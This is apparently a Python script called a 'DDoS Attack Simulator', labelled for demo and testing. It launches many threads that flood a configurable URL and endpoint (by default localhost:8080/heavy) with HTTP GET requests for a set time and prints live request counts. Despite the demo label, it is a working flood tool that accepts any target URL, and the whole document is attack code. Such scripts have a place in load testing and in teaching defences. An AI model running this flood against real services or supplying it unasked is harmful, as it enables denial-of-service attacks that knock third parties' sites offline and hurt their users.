"""
DDoS Attack Simulator (for demo/testing only)
----------------------------------------------
Usage:
    python attacker.py --url http://127.0.0.1:8080 --threads 50 --duration 30
"""

import threading
import requests
import argparse
import time
import sys

parser = argparse.ArgumentParser(description="Simple DDoS simulator for demo")
parser.add_argument("--url",      default="http://127.0.0.1:8080", help="Target base URL")
parser.add_argument("--threads",  type=int, default=20,            help="Number of attack threads")
parser.add_argument("--duration", type=int, default=30,            help="Attack duration in seconds")
parser.add_argument("--endpoint", default="/heavy",                help="Endpoint to flood")
args = parser.parse_args()

TARGET   = args.url + args.endpoint
THREADS  = args.threads
DURATION = args.duration

sent = succeeded = failed = 0
lock      = threading.Lock()
stop_flag = threading.Event()

def flood():
    global sent, succeeded, failed
    session = requests.Session()
    while not stop_flag.is_set():
        try:
            r = session.get(TARGET, timeout=3)
            with lock:
                sent += 1
                if r.status_code == 200: succeeded += 1
                else:                    failed    += 1
        except Exception:
            with lock:
                sent  += 1
                failed += 1

def print_stats():
    start = time.time()
    while not stop_flag.is_set():
        elapsed = time.time() - start
        with lock:
            s, ok, fail = sent, succeeded, failed
        rps     = round(s / max(elapsed, 0.001))
        bar_len = min(int(elapsed / DURATION * 40), 40)
        bar     = "█" * bar_len + "░" * (40 - bar_len)
        sys.stdout.write(
            f"\r[{bar}] {int(elapsed)}s/{DURATION}s  "
            f"sent={s}  ok={ok}  fail={fail}  rps≈{rps}     "
        )
        sys.stdout.flush()
        time.sleep(0.5)

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════╗
║        💥  DDoS Attack Simulator                 ║
╠══════════════════════════════════════════════════╣
║  Target   : {TARGET:<37}║
║  Threads  : {THREADS:<37}║
║  Duration : {str(DURATION)+'s':<37}║
╚══════════════════════════════════════════════════╝
""")
    time.sleep(1)

    workers = [threading.Thread(target=flood, daemon=True) for _ in range(THREADS)]
    for w in workers: w.start()

    stats_thread = threading.Thread(target=print_stats, daemon=True)
    stats_thread.start()

    time.sleep(DURATION)
    stop_flag.set()

    print(f"\n\n✅  Attack finished.")
    print(f"   Total sent : {sent}")
    print(f"   Succeeded  : {succeeded}")
    print(f"   Failed/blk : {failed}")
